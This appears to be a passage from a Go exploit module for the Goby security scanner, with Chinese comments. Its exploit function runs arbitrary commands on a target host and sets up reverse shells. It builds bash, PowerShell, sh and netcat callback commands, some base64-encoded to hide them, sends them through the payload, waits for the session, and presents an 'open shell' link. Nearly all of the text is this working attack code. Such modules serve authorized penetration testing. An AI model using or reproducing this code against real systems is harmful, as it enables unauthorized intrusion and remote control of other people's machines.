		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash1718183102

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
